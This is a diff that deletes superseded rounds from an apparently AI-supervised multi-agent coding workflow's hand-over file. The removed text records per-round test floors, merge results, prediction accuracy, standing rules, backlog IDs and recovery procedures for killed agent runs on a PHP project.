-**The merge went GREEN first try** (third consecutive) and **both totals were exactly additive**.
-Backlog **630 → 651**; round 60's 21 provisional ids are now **E631–E651**.
-
-| package | floor at close |
-|---|---|
-| **sugar-crush** | **10351 / 160648 / 1 skipped / rc 0** — MEASURED |
-| **tools/tests** | **58 / 214 / rc 0** — MEASURED |
-| **candy-pty** | **644 / 1785 / 16 / 1 warning / rc 0** — MEASURED |
-| candy-core · candy-flip · candy-mosaic | **CARRIED from round 55, NOT re-measured.** An inference, not an observation. |
-
-### 🔴 READ THIS BEFORE ANYTHING ELSE: THE PROMPT PLAN RUNS NEXT, AND IT INVALIDATES THINGS IN HERE
-
-**The decision on record is: run `prompt_plan.md` to completion FIRST, then come back for round 61.**
-Round 60 cleared the two crush_code items that blocked it (§2.6 of `prompt_plan.md`, rows 1 and 5).
-While that plan runs, **launch no crush_code round** — rows 2 and 7 of its interference table are
-free only because no round is in flight, and they re-block the instant one is.
-
-**Everything in the section below is what the prompt plan will make WRONG in this file, in the
-briefs, and in the backlog.** None of it is a blocker. All of it fails SILENTLY if not re-derived.
-
-#### 1. THE FLOOR. Re-measure it. Never carry it.
-
-Every figure in the table above is dead the moment the prompt plan lands. It adds ~11 files under
-`sugar-crush/src/` and hundreds of assertions.
-
-🔴 **This is not a hypothetical: round 60's brief shipped round 58's floor to three lanes and was
-caught 30 seconds after launch, by reading the script rather than by any check.** `node --check`,
-nine rendered prompts and dry-run commands all passed over it, because a floor paragraph is *data*
-to the script and an *instruction* to the agent, and no static check crosses that boundary.
-
-- **Round 61's floor block must be OBSERVED at its own base**, by running the suites. Not copied
-  from this file, and not copied from `prompt_worklog.md` either — that records the prompt plan's
-  own baseline, which is an input, not the crush_code floor.
-- **`candy-core` / `candy-flip` / `candy-mosaic` have been carried since round 55.** Round 60's
-  brief asserted they were "measured at this exact commit, per E167" and that was false. If a lane
-  touches one, it MEASURES it.
-- **Diff the new floor block against this table before launching.** Every round.
-
-#### 2. THE SKIP-COUNT CANARY WILL SILENTLY MISFIRE
-
-Every lane brief hardcodes: *"the skip count must stay exactly 1"*, the one skip being
-`tests/MCP/McpClientTest.php`, and tells lanes that **a 2 means the vendor closure is gone and every
-figure since is void**. If the prompt plan legitimately adds a skip, three round-61 lanes each
-conclude their sandbox is broken and stop — a correct-looking closure failure with no closure failure.
-
-`prompt_plan.md` already treats an added `markTestSkipped` as a **finding** (its §lines 173, 2117),
-so it should not drift there casually. But **verify the count before writing round 61's brief**, and
-if it moved for a real reason, re-baseline the canary in the brief and say why in the same sentence.
-
-#### 3. LINE NUMBERS AND QUOTED CODE IN OPEN BACKLOG ENTRIES WILL ROT
-
-The prompt plan's **phases 4, 8 and 9** rewrite `sugar-crush/src/Chat.php`,
-`src/Context/ContextCompactor.php` and `src/Tools/BuiltIn/Bash.php`. This backlog has open entries
-quoting exactly those files **with line numbers and inline code**. They do not go red; they go
-**stale**, which is worse.
-
-- **Re-verify any entry against the tree before scheduling it.** Precedent: round 60's C7 arrived
-  claiming `$defaultTools` was "inert end to end" and it was materially wrong — the field was
-  consumed faithfully and died one step later.
-- The same applies to entries citing `src/Agents/*` and `src/App/App.php` — round 60 rewrote those
-  itself, so entries written before it may already be stale.
-- **E651 is a live example of the class**: `src/Tui/Renderer.php` cites `ProcessExecutor.php:81`/`:235`,
-  and lane c moved that file.
-
-#### 4. THE SANDBOXES MUST BE RE-CUT, NOT RECYCLED
-
-`/home/sites/crush-lane-{a,b,c}` are `cp -a` copies at `09139a807`. After the prompt plan they are
-far behind. **Re-cut from the new master**, then verify, per lane, before launch:
-
-```sh
-php -r 'echo count(array_filter(glob("/home/sites/crush-lane-a/sugar-crush/vendor/sugarcraft/*"),"is_link"))."\n";'  # 18
-php -r 'echo count(array_filter(glob("/home/sites/crush-lane-a/candy-pty/vendor/sugarcraft/*"),"is_link"))."\n";'     # 7
-```
-
-Do NOT settle this with `ls` — `ls -l | grep -c '^l'` has printed a correct-looking 18 twice while
-every entry was a real directory. **Never run `composer install`/`update` in a lane root.**
-
-#### 5. TREE-SIZE BOUNDS: THE PROMPT PLAN FITS, WITH ROOM — BUT THE TEST COUNT STILL MOVES
-
-Round 60 removed the `src/` file-COUNT census. **MEASURED (E638):** green at +1/+6/+220/+222, first
-red at **+223** added source files. The prompt plan's ~11 files are nowhere near it, and the census
-guard itself has **650 files** of room. **Before round 60 this was green at +5 and red at +6** —
-that coupling is what the round removed, and it is why the prompt plan can now proceed.
-
-🔴 **But the suite's TEST COUNT is still a function of `src/`'s size (E634)** — one data provider
-enumerates the tree, so **each added `src/` file adds +1 test** plus assertions from per-file loops
-elsewhere. **Do NOT cite a constant for the assertion delta.** E634 retracts its own predecessor's
-"+58"; two later measurements both give +53, and the delta depends on the **shape** of the file
-added. It is a measurement, not a property — which is the whole reason item 1 above says *observe*.
-
-If a bound in E638's table does red, the instruction is to **rewrite `RepoMapBlock`'s design note**,
-never to loosen the bound back toward an invented ratio. E638's withdrawn fourth bound —
-`MAX_SECTION_BYTES * 2 / 3`, a margin standing in for the word *"comfortably"* — reddened at ~+60
-files and would have re-imposed the coupling inside the fix for it.
-
-#### 6. WHAT THE PROMPT PLAN WILL NOT TOUCH
-
-`prompt_plan.md` declares `docs/plans/crush_code_*.md` **read-only** to itself. So this file, the
-worklog and the backlog survive intact — **the rot is in what they SAY about the tree, not in the
-files themselves.** Nothing here needs merging; everything here needs re-verifying.
-
-### NEW STANDING RULES FROM ROUND 60
-
-- **55 — verify the brief's PROSE, not only what executes.** A floor block is data to the script and
-  an instruction to the agent. `node --check`, a rendered prompt and a dry-run command all pass over
-  a stale figure. Diff every inherited paragraph against the previous round's close before launch.
-- **56 — do not predict merge colour.** Rounds 57, 58 and 60 each named a specific mechanism and each
-  was wrong (57 predicted clean and went red; 58 and 60 predicted red and went green). The mechanisms
-  were real and did not fire. **Run the merged suite; it is the only instrument that works.**
-- **57 — rule 54, corrected: the first lane merges clean iff master has not moved IN THE CONTENDED
-  FILE.** Master moved twice this round and lane a still landed clean, because the commits touched
-  RESUME and the prompt-plan files, not the backlog.
-- **58 — a margin nobody derived is a coupling nobody counted.** If a bound needs slack, argue the
-  slack on its own terms; never smuggle an adverb from the prose in as a ratio in the assertion.
-
-⚠️ **RULE 47'S RATE, and it moved in an unexpected direction.** Round 60 added **three** more
-supervisor-authored false claims — the stale floor, the false "measured at this exact commit" for
-three packages, and the over-broad no-new-`src/`-files constraint (**measured unnecessary for 1–5
-files**). But **no lane found a false claim in the part of the brief it was checking**: lane b, the
-lane prediction (a) aimed at, reported ownership, scope and floors all correct. **The lane that
-caught me was lane a, about a constraint imposed on the other two.**
-
-### 🔴 WHAT IS OUTSTANDING WHEN YOU PICK THIS UP
-
-1. **RUN `prompt_plan.md` TO COMPLETION FIRST.** Then re-read the section above before setting up
-   round 61. Round 60 is closed and merged; all three sandboxes are recycled and clean at
-   `09139a807`.
-2. **Round 61 has no lanes chosen.** 21 fresh entries (E631–E651) landed this round, several of them
-   live fail-open findings worth ranking: **E644** (`AgentManager::executeAll()`, the live parallel
-   path, bypasses the tool grant entirely), **E639** (no production caller supplies a registry),
-   **E643** (the skill grant has the identical fail-open shape and was not fixed), **E648** (the live
-   worker `require`s an autoloader path taken off the wire).
-3. **Publication state — RE-MEASURE IT, never infer it.** ⚠️ **The user commits into this working
-   copy directly and pushes it themselves**, so local-vs-remote moves without the supervisor doing
-   anything. `prompt_plan.md` was modified in the working tree during this very close-out.
-4. **E490 is answered but NOT closed.** Pooled 538 takes, zero events, bound 0.5553%. **60 more takes
-   (~48 min) with an instrument row armed FIRST** excludes 1-in-200 at 95%. Independent of the prompt
-   plan; can run at any time.
-5. 🔴 **THE BACKLOG HAS NO OPEN/CLOSED MARKER.** Most entries carry no disposition stamp, and that is
-   **not** a count of open items. Do not infer outstanding work by counting unmarked entries.
-   Known pre-existing file defects: **`E70`, `E71`, `E72` are referenced in the body with no heading,
-   and `E78` is duplicated.**
-
----
-
-## 0-NOW-60 (now superseded). ROUND 59 CLOSED (floor 10281) — the E562 audit came back empty, and that is the stronger answer
-
-**CLOSED at `1621bb7d7`, base `e4c69b04e`.** Recovery run `wf_146e1913-ca2`, 8 agents, zero errors.
-**The merge went GREEN first try** (second consecutive). Backlog **592 → 630**; round 59's 37 provisional
-ids are now **E594–E630**.
-
-| package | floor at close |
-|---|---|
-| **sugar-crush** | **10281 / 159378 / 1 skipped / rc 0** — MEASURED |
-| **tools/tests** | **58 / 214 / rc 0** — MEASURED |
-| **candy-pty** | **644 / 1785 / 16 / 1 warning / rc 0** — MEASURED |
-| candy-core · candy-flip · candy-mosaic | **CARRIED, not re-measured.** An inference, not an observation. |
-
-### THE THREE THINGS WORTH CARRYING OUT OF ROUND 59
-
-1. 🔴 **E562's AUDIT FOUND NOTHING, AND BACKED IT.** Every standing `SURVIVED` verdict in the backlog is
-   settled by a quoted test count, a killed control at the same scope, or a later kill of the same
-   mutation. **Nothing is unverified.** Two corrections came with it: the population's alphabet was wrong
-   (37 capitalised rows, plus **12 more** the word `SURVIVED` cannot see), and **E562's stated trigger is
-   false** — `--filter` is a SUBSTRING match, so a truncated method name still runs the test.
-2. 🔴 **THE SCOPE MECHANISM PRODUCED ZERO OUT-OF-LANE EDITS** — all three `laneScopeOutput`s empty,
-   `outOfLaneFiles` `[]` everywhere, first such round since 55. It caught a brief that sent lane b at two
-   files it does not own; the lane refused and measured instead. **This falsified side-prediction s2,
-   which had predicted a non-empty scope output as the evidence of success** — see rule 51.
-3. **E490 IS STILL OPEN, and the supervisor's own N was 298 takes short.** Pooled across both campaigns:
-   **538 takes, zero events, bound 0.5553%.** `E593` argued against a 598-take threshold as unaffordable
-   while 538 were already banked — **60 more takes (~48 min) reaches it.** Three caveats keep 0.5553%
-   optimistic: different trees, ~2.5h of overlapping run windows, and the 298-take half **has no
-   instrument row**, so its watchdog was never shown to fire.
-
-### NEW STANDING RULES FROM ROUND 59
-
-- **51 — predict the FINDING, not the diff.** A preventive control that works erases the evidence a naive
-  prediction looks for. Name the artefact the control produces (a filed finding, a refusal, a measurement
-  taken instead of an edit), never the damage it prevents.
-- **52 — a killed round invalidates its prediction, and somebody must say so in writing.** At recovery
-  time, either re-predict for the round that will actually run, or stamp the prediction file INVALIDATED.
-- **53 — a SURVIVED verdict has an expiry date and no expiry check.** A KILLED verdict cannot decay; a
-  survival asserts that *nothing* covers a line and any new test can falsify it silently. **Record the
-  scope with every survival.**
-- **54 — an induced rule dies when its unstated precondition changes.** "The first lane merged always
-  lands clean" assumed master had not moved since the base was cut. Write down the condition the history
-  shared.
-
-⚠️ **RULE 47'S RATE: four supervisor-authored false claims in three rounds** (round 58: E527 inverted,
-E529 false as filed; round 59: E571 `public` not `private`, and the merge prediction's "57 and 58 both
-went red" — round 58 went green). **The brief and the prediction are the two artefacts nothing downstream
-is asked to falsify.**
-
-### 🔴 WHAT IS OUTSTANDING WHEN YOU PICK THIS UP
-
-1. **ROUND 60 IS PREPARED BUT NOT LAUNCHED.** Its three lanes are E252/E409, C7, and C4/C8/E59 — chosen
-   because they are the crush_code items that BLOCK the separate prompt-architecture plan
-   (`prompt_plan.md`), not because they are the next items in the ledger. Script and briefs:
-   `.../workflows/scripts/crush-round-60.js`. **Read `round60-prediction.txt` before launching; per rule
-   52, re-predict if the round is killed and recovered.**
-   🔴 **THE ROUND HAS AN INTERNAL ORDERING CONSTRAINT AND IT IS NOT OPTIONAL** — see the script's
-   `NO NEW src/ FILES` clause. Lane a is dismantling the `src/` file-count census that lanes b and c would
-   otherwise red by merely adding a file.
-2. **Publication state — RE-MEASURE IT, never infer it.** ⚠️ **The user commits into this working copy
-   directly and pushes it themselves**, so local-vs-remote moves without the supervisor doing anything.
-   `prompt_expand.md` (4,063 lines) arrived that way mid-round-58, authored as `Test User`.
-3. **E490 is answered but NOT closed.** See above. The next concrete action is 60 more takes with an
-   instrument row armed FIRST, which would exclude 1-in-200 at 95%.
-4. ~~**`left_steps.md`**~~ — **THE FILE IS GONE.** It was untracked (so it is in no commit and cannot be
-   recovered from git), stale, and wrong: one of its claims — that `crush_code.md` no longer exists — was
-   false. It was deleted from the working copy during the round-59 close. **Nothing depended on it and
-   nothing should be reconstructed from memory of it.** If a "what is left" census is wanted, generate it
-   from the backlog and `git log`, and commit the generator with it — an ungenerated ledger rots and this
-   one did.
-5. 🔴 **THE BACKLOG HAS NO OPEN/CLOSED MARKER.** 505 of ~590 entries carry no disposition stamp, and that
-   is **not** 505 open items. Do not infer outstanding work by counting unmarked entries.
-   Known file defects, measured and pre-existing: **`E70`, `E71`, `E72` are referenced in the body but
-   have no heading, and `E78` is duplicated.**
-6. **A separate plan now exists and is NOT part of this one.** `prompt_plan.md` / `prompt_worklog.md` /
-   `prompt_resume.md` execute `prompt_expand.md`. It is mentioned here only so the two are not run into
-   each other: **only one plan may claim the whole-suite floor in a given window**, because this plan
-   scores an exact predicted test count and that one adds hundreds of assertions.
-
----
-
-## 0-NOW-59 (now superseded). ROUND 58 CLOSED (floor 10269) — killed and recovered, green where red was predicted, and a census the supervisor got wrong
-
-**Closed 2026-08-25 at `e4c69b04e`, from base `535d721ff`.** Backlog **555 → 592**.
-Full write-up in `docs/plans/crush_code_worklog.md` under `## ROUND 58`.
-
-**A session limit killed all three implementers ~9.5 minutes in**, zero completions. Recovered as
-`Finish → Review → Fix`. **Lane b had 12 files and 246 insertions uncommitted** — its whole
-swallowing-catch sweep, never executed by anyone — committed verbatim as labelled WIP before anything else
-touched that root.
-
-**The prediction missed both figures and the merge outcome.** Tests 10285 predicted, **10269** measured —
-and the total was *exactly additive*, so the miss is entirely in the +70 estimate, not in the merge.
-Assertions ≥160,000 predicted, **159,236**. **A red merge was predicted and did not come.** Round 57 argued
-file-level disjointness and went red; round 58 argued guard-level overlap and went green. **Both
-under-determine the outcome — run the merged suite either way.** Exactly right: 2 conflicts not 3, backlog
-landing on 592 (the top of the predicted range), and candy-pty unchanged.
-
-🔴 **THE SUPERVISOR FILED E591 WRONG AND CORRECTED IT IN PLACE.** It first claimed **0 of 3** lanes checked
-the ownership map, from a grep over the lanes' *structured result fields* — which do not contain the
-backlog entries the lanes actually filed. **Rule 30 aimed at the supervisor's own instrument.** The tree
-says **2 of 3**, both finding real defects (E561, E573), and the real defect underneath was worse than the
-one filed: **the fix stage is handed no scope information at all.**
-
-**Lane a's best finding came from ignoring a prescription's scope** (rule 48): a guard commissioned for
-three sites, built over the whole of `tests/`, found a fourth — and the fourth was the only one that could
-come out **green on a hang**.
-
----
-
-## 0-NOW-58 (now superseded). ROUND 57 CLOSED (floor 10215) — a red merge worth having, and E490 got a number at last
-
-**Closed 2026-08-25 at `535d721ff`, from base `1dea13c4f`.** Backlog **523 → 555**.
-Full write-up in `docs/plans/crush_code_worklog.md` under `## ROUND 57`.
-
-**Tests predicted EXACT for the fourteenth consecutive round** — 10214 predicted, 10214 measured at the
-merge. **The floor is 10215** because the merge went red and the fix added a test: two numbers answering
-two different questions, as in round 53. Assertions 156961 against a deliberately weak ≥150,000 bound.
-
-🔴 **THE MERGE WENT RED, AND BOTH FAILURES WERE LANE C's NEWLY-WIDENED GUARDS FIRING ON LANES A AND B's
-NEW FILES.** Zero textual conflict. **One guard found a real defect (E554** — a 31-line doc-block stacked
-above another, documenting nothing, while the method it describes 120 lines below had none). **The other
-guard WAS the defect (E555** — it called a namespace a dangling class; both files were correct, so the
-classifier was wrong; **rule 33, third occurrence in four rounds**). The E555 fix's third mutation survived
-— and that was a fact about the tree, not the guard, since no empty directory existed for the clause to
-trip over — so the clause was made pinnable rather than excused. **Then the E555 fix tripped E554's guard**
-by stacking its own doc-block, one commit after the pair caught the lanes.
-
-**Round 57's prediction was right about git and wrong about the suite.** It argued source-set disjointness
-by FILE and predicted no second conflict. There was none — and the suite still went red. **The sets were
-disjoint by file and overlapping by GUARD**, which a file-level disjointness argument cannot see. Round
-53's prediction had named this hazard in writing; round 57's did not. **Round 58's does.**
-
-**E490 got a number instead of a candidate:** 53 takes, 0 events, ≈5.5% upper bound against a ≈1.3% prior
-— and a lane that declined to call that a fix, because it distinguishes nothing.
-
-**The ownership-map rate moved 0/3 → 1/3** after rule 42, and the one lane that checked found a real
-map-vs-brief disagreement (its map granted all of `src/MCP/`, its file list enumerated three files). One
-observation is all that is. Round 58's map and file lists were reconciled before launch so a disagreement
-found next round is news.
-
----
-
-## 0-NOW-57 (now superseded). ROUND 56 CLOSED (floor 10126) — the restart, the recovery, and the first prediction miss in thirteen rounds
-
-**Closed 2026-08-25 at `1dea13c4f`, from base `d38b644f4`.** Backlog **492 → 523**.
-Full write-up in `docs/plans/crush_code_worklog.md` under `## ROUND 56`.
-
-🔴 **THE PREDICTION MISSED: 10167 predicted EXACT, 10126 measured — −41 tests**, and assertions came in at
-149182 against a ≥152,200 lower bound. **First miss on tests in thirteen rounds, first on assertions in
-four.** A client restart killed all three implementers mid-flight; when the recovery was built the
-prediction was deliberately left unchanged, with an amendment saying in writing that if the restart cost
-the round tests, this is where it would show. It showed. **Both totals came out exactly additive** —
-10059+22+38+7 and 148589+204+320+69 — which is itself notable, because round 44's headline was that
-assertion counts are *not* additive across a merge. They are when the source sets are genuinely disjoint.
-
-**THE TRANSCRIPTS OUTLIVED THE AGENTS, AND THAT IS A RECOVERY CHANNEL THIS PLAN HAD NEVER USED.** The
-three killed agents' JSONL transcripts survived in the dead session's directory
-(`.../700ebe8e-.../subagents/workflows/wf_7c73518b-ad8/`). Mining them corrected three things the
-supervisor had asserted from the lane trees alone: that no lane had observed a baseline (all three had,
-exactly); that lane c's watchdog had never been run (it was green at `--filter` with a real
-known-positive); and that lane a's item 3 was outstanding (it was done). **The tree tells you what exists;
-it does not tell you what was measured.** Also recovered and otherwise lost: two mutation tables, an
-undeclared brief deviation, a deferred defect, and a committed figure-provenance defect.
-
-**E492 — the round shipped ROUND 53's ownership map and not one lane noticed.** `E416` and "ownership
-map" appear on line 1 of each transcript and nowhere else. **The measurement worth keeping is the rate:** a
-standing rule that names its own failure mode, cites its round, and gives the exact reporting action fired
-**zero times out of three**.
-
-**If a round is killed again:** read the lane git state, not the harness's report (rule 30). Commit any
-dirty lane tree as labelled WIP before anything else touches that root. Mine the dead agents' transcripts
-before writing any brief about what they did. And **do not assume the last recovery's shape fits** — check
-how far implement actually got before choosing between "finish the lanes" and "skip to review".
-
----
-
-## 0-NOW-56 (now superseded). ROUND 55 CLOSED (floor 10059) — read this first, then §0 for the standing rules
-
-**Closed 2026-08-25 at `b489405ba`, from base `a8acfcc9`; then `d38b644f4` after the E491 fix.**
-Three lanes, nine agents, zero errors.
-
-| package | floor at `d38b644f4` |
-|---|---|
-| **sugar-crush** | **10059 / 148589 / 1 / rc 0** |
-| **candy-core** | **842 / 7587 / 24 / rc 0** |
-| **candy-flip** | **83 / 227 / 2 / rc 0** |
-| **candy-mosaic** | **459 / 7753 / 6 / rc 0** |
-| **candy-pty** | **610 / 1408 / 16 / 1 warning / rc 0** |
-
-**The prediction was EXACT on both numbers** — 10059 tests and 148589 assertions, written to
-`round55-prediction.txt` before a single merge. Tests exact for the thirteenth consecutive round,
-assertions for the fourth. candy-core's skip drop 25 → 24 was predicted too. Merge conflicts: the backlog
-only, three times, exactly as predicted; every source set was disjoint.
-
-**Backlog 457 → 491.** Lane ids E458-E489 (renumbered from provisional `Ea55-*` longest-id-first, base
-derived from the file). Supervisor: E490, E491. Mid-round the user reported E455, E456 and E457.
-
-**The round's biggest find is in a published library, and it is not in sugar-crush.**
-`candy-pty`'s `PosixMasterPty::retryOnEintr()` had TWO defects: its EINTR detection could never be true
-(`Libc::errno()` reads 0 after an interrupted `stream_select()` because PHP resets errno raising its own
-warning first), so the retry **had never executed once**; and when it did retry it restarted the caller's
-timeout instead of recomputing the remainder. Found by writing the first test that ever CALLED the
-function — its only prior coverage asserted `method_exists()`. See E491 and rule 36.
-
-**Second published-library find:** E462, a real fd leak — `PosixMasterPty::close()` called `dup()` and
-discarded it, leaking one `/dev/ptmx` descriptor per pty that had been used, measured linear over five
-cycles with a control.
-
-**E453 is fixed and verified independently:** the `--unused` CI step exits 1 at `a8acfcc9` and 0 on the
-merged tree. Fixed by RECORDING the `candy-kit` deferral in `extra.sugarcraft.deferred-wiring`, not by
-pruning the dependency — then lane c filed E487/E488 against its own fix.
-
-## 0-NOW-55 (now superseded). ROUND 54 CLOSED (floor 9994) — read this first, then §0 for the standing rules
-
-**Closed 2026-08-25 at `49ae499e`, from base `606a131c`.** Three lanes. The round survived a host reboot
-and a session limit, both landing in the fix stage; see the recovery section below and E450/E452.
-
-| package | floor at `49ae499e` |
-|---|---|
-| **sugar-crush** | **9994 / 144819 / 1 skipped / rc 0** |
-| **candy-core** | **842 / 7573 / 25 / rc 0** |
-| **candy-flip** | **83 / 227 / 2 / rc 0** |
-| candy-mosaic | 459 / 7753 / 6 / rc 0 (untouched since round 52) |
-| candy-pty | 606 tests / 16 skipped / 1 warning / rc 0 — **assertions are NOT a constant, see E430; do not quote one as a floor** |
-
-Backlog **428 → 452**: lane ids E429-E449, supervisor findings E450-E452.
-
-**Invariants verified at the merge:** skipped exactly 1 · closure 18/18 · 3/3 · 6/6 by `is_link()` +
-`realpath()` prefix · `check-path-repos --no-lib-path-repos` rc 0 · config md5
-`05480c743aff302fd6c06c5a4a4c2210` · zero tracked per-lib locks · zero orphaned `php -S` **on a quiet
-tree** (E451 — the reading is meaningless while a suite runs).
-
-### 🔴 THE PREDICTION WAS EXACT AND THAT IS WHY THE INSTRUMENT GOT CHECKED
-
-Predicted `9994 / 144819` before the first merge command; measured `9994 / 144819`. Tests exact for the
-**twelfth** consecutive round, assertions for the third.
-
-**But exactly-the-sum was the outcome the prediction argued AGAINST.** Lane b added 312 lines to
-`sugar-crush/src/MCP/StdioMcpServer.php`, a file lane c's widened `DescriptorInheritanceGuard` walks, and
-neither lane's suite had seen the other's half — the loaded rule-32 case. The prediction named three
-outcomes and expected the total to EXCEED the sum or go red. It did neither.
-
-A number landing where you predicted is not evidence when you predicted it would not land there, so the
-guard was checked rather than trusted: it **does** roster `MCP/StdioMcpServer.php::start`, so it is alive
-on the rewritten file. The count did not move because lane b's addition is a stderr DRAIN, not a new
-rostered spawn site. Genuine outcome, live instrument. **Do this check every time a semantic-conflict
-prediction resolves quietly** — a silent census and a dead census produce identical numbers.
-
-### 🔴 E450 — THE ROUND'S MOST VALUABLE FINDING, AND IT IS ABOUT THIS PLAN'S OWN HARNESS
-
-A review is a snapshot of the tree as the IMPLEMENTER left it. When a fix agent is killed and relaunched,
-it gets that same review — of a tree that no longer exists — plus a brief saying "do not redo committed
-work". Measured at this merge: **six of lane c's thirteen commits and nine of lane a's seventeen had been
-reviewed by nobody.** The brief pointed at the findings list, which is the surface that HAS been reviewed.
-Lane c found this itself and said so.
-
-**If you relaunch a killed fix agent, state the review's tree position in its brief** (`written at <sha>,
-N commits over base; HEAD is now M commits over`) **and make reviewing the M−N unreviewed commits its
-FIRST task** — or re-run the review against current HEAD instead of replaying the stale one. A stale
-review is worse than none, because it looks authoritative.
-
-### 🔴 IF THE ROUND IS KILLED, DO NOT USE `resumeFromRunId` — SEE E452
-
-Resume replays the longest unchanged PREFIX of `agent()` calls, and under `pipeline()` the call order is
-set by completion times, so the prefix cannot be reproduced. Measured this round: it replayed the three
-implements from cache and then started three REVIEW agents, including one for a lane whose fix had
-already landed.
-
-**The recovery that works:** read the round script as text, truncate at its `phase('Implement')` line,
-rewrite `export const meta` → `const meta`, `require()` it, and call the real `fixPrompt` with the cached
-stage results pulled out of `journal.jsonl`. That regenerates each prompt byte-identically (verified at
-53,445 and 51,840 chars). Emit only the missing agents into a fresh script and leave completed lanes
-alone. Preserve any uncommitted work with `git stash create` + `git update-ref refs/rescue/<tag>`, which
-snapshots into git WITHOUT committing red and WITHOUT disturbing the working tree.
-
-**The recipe was dry-run against round 55's own script on 2026-08-25, while the round was healthy and
-nothing needed recovering** — a known-positive control (rules 15/25), because a recovery tool is exactly
-the kind of instrument you cannot test at the moment you need it. It works: the truncate-and-`require`
-step exports `fixPrompt`, `reviewPrompt`, `implementPrompt`, `LANES`, `COMMON`, `BASE`, `ROUND`, and
-`fixPrompt(review, LANES[0], impl)` renders 23,995 chars with both stage results interpolated. Two things
-to know before you run it: the lane objects key on **`key`**, not `id` (`LANES.map(l => l.key)` → `abc`),
-and the script only parses if you wrap it — `node --check` on a workflow script fails with "await is only
-valid in async functions", which is expected, since the body runs in an async context. Wrap it in
-`async function __w(){ … }` and rewrite the trailing `return` before you check it.
-
-🔴 **`/tmp` DOES NOT SURVIVE A REBOOT.** Everything under `~/.claude` did — lane commits, the round
-script, the journal, per-agent transcripts. `/tmp` took the staged sweep script and every lane
-scratchpad. Anything a round needs across a reboot belongs in git or under `~/.claude`. Note also that a
-relaunched agent can find a PREDECESSOR's files in its scratchpad namespace (E427 spanning a kill), so a
-bare `out.txt` read or an `until grep -q` wait there can be satisfied by work that is not yours.
-
-### 🔴 MEASURE THE NEXT ROUND'S FLOOR AT THE COMMIT THE LANES BRANCH FROM (E167)
-
-The figures above are at `49ae499e`. If master moves before round 55's lanes are cut, re-measure at the
-actual base — do not carry these forward as though they were.
-
-## 0-NOW-54 (now superseded). ROUND 53 CLOSED (floor 9946) — read this first, then §0 for the standing rules
-
-**SUITE FLOOR, THREE PACKAGES** (rule 28), all measured at `b8808d5a`, tree clean:
-
-| package | tests / assertions / skipped / rc |
-|---|---|
-| **sugar-crush** | **9946 / 144269 / 1 / rc 0** |
-| **candy-core** | **819 / 7390 / 25 / rc 0** |
-| **candy-flip** | **83 / 227 / 2 / rc 0** |
-
-candy-mosaic was untouched this round and stays at **459 / 7753 / 6**. Merges `3fa60ce7` a, `52e51e62` b,
-`5a1381bf` c; renumber `3074d2ec`; merge-collision fix `b8808d5a`. **Skips MUST stay exactly 1** —
-`MCP\McpClientTest::testLoadConfigReturnsEmptyArrayWhenFileGetContentsFails`, and **E413 warns that
-`BackgroundSupervisorReapTest` moves that count off 1 on any non-Linux runner.** 18/18 · 3/3 · 6/6 closure
-by `is_link()` + `realpath()` prefix; `check-path-repos --no-lib-path-repos` rc 0; config md5
-`05480c743aff302fd6c06c5a4a4c2210`; zero tracked per-lib locks; zero orphaned `php -S` servers **counted
-the honest way (E428 — the old `pgrep` spelling answers 1 on a clean host by matching itself)**.
-Backlog **394 → 428**: round-53 lane ids are **E395–E426**, and E427/E428 are the supervisor's. **Round 54
-files from E429.**
-
-**Tests predicted EXACTLY for the ELEVENTH consecutive round — 9943 at the merge — and the assertion
-lower bound landed EXACTLY on the bound for the second round running (144262).** The final floor is
-9946/144269 because the merge went RED and the fix added three fixtures; the 9943/144262 figure is the
-prediction's verdict and 9946/144269 is the floor.
-
-### 🔴 THE MERGE WENT RED, AND THE PREDICTION SAID IT WOULD
-
-Written to `round53-prediction.txt` BEFORE the first merge: *"c's scanner files merge CLEANLY as text and
-the merged sugar-crush suite may still go RED … RULE 32 IS LIVE HERE."* It did, on exactly the predicted
-pair — lane c's `DescriptorInheritanceGuardTest` against lane b's `Providers/ClaudeCodeProvider.php`,
-zero textual conflict.
-
-**The finding was a FALSE POSITIVE and the scanner was what was wrong.**
-`ChildLifetimeScanner::classifyLocal()` judged conditionality by brace depth alone, so it said of a
-reaper sitting in a generator `finally`: *"runs only inside a nested block, so it does not cover every
-path out of this function."* That is flatly false about `finally`, the ONE nested block that runs on
-every path out — including the case lane b's own comment documents, a consumer that `break`s out of the
-`foreach` and destroys the generator mid-body.
-
-🔴 **NEW STANDING RULE 33: WHEN A GUARD OFFERS YOU AN EXEMPTION ROW, ASK FIRST WHETHER THE CODE IS
-CORRECT — IF IT IS, THE CLASSIFIER IS THE DEFECT.** The guard's failure text offered two blessed
-resolutions (name the fds, or add an `ACCOUNTED_FOR` row). Both were wrong here. An exemption row written
-for correct code is where the next real offender hides. The classifier learned the rule instead, keyed by
-depth and pinned in BOTH polarities: closer in `finally` → short; closer in `if` inside `finally` →
-unclassified; closer in `finally` inside a `foreach` → unclassified. Dropping the new arm reds 2 tests.
-
-**And the fixtures were wrong before the scanner was.** The first two both wrote `return $this->pump($h)`,
-which makes the handle an escape and reads `long`. A fixture whose expected value the instrument cannot
-produce is not evidence about the instrument (rules 15/25).
-
-### 🔴 WHAT ROUND 53 PROVED ABOUT THE CROSS-LANE CONTROL
-
-Lane c caught, on its own, a merge instruction **it had written itself** that would have deleted
-`BackgroundSupervisor::spawnSession` from the guard roster on the grounds that lane b reaps it
-unconditionally. Re-measured against lane b's actual head, the happy path calls `reapIfExited($proc)` and
-`terminateAndClose` appears only in the throw branch: *the arithmetic was right and the mechanism
-inverted*. Left alone it would have silently deleted E366's own HIGH from the guard built to catch it.
-**Fourth consecutive round in which the deliberate b/c overlap found something neither lane could see
-alone.**
-
-### 🔴 MEASURE THE NEXT ROUND'S FLOOR AT THE COMMIT THE LANES BRANCH FROM (E167)
-
-…and have the lanes observe it themselves. A lane touching a second library owes that library's figures
-separately (rule 28). **Write the brief with every package's floor in it.**
-
-## 0-NOW-53 (now superseded). ROUND 52 CLOSED (floor 9860) — read this first, then §0 for the standing rules
-
-**SUITE FLOOR, THREE PACKAGES** (rule 28), all measured at `cb0a7c69`, tree clean:
-
-| package | tests / assertions / skipped / rc |
-|---|---|
-| **sugar-crush** | **9860 / 143784 / 1 / rc 0** |
-| **candy-core** | **807 / 7288 / 25 / rc 0** |
-| **candy-mosaic** | **459 / 7753 / 6 / rc 0** |
-
-Merges `3e67a995` a, `ddc343f6` b, `dba03fa4` c; renumber `cb0a7c69`. Supersedes every earlier figure.
-**Skips MUST stay exactly 1** — `MCP\McpClientTest::testLoadConfigReturnsEmptyArrayWhenFileGetContentsFails`.
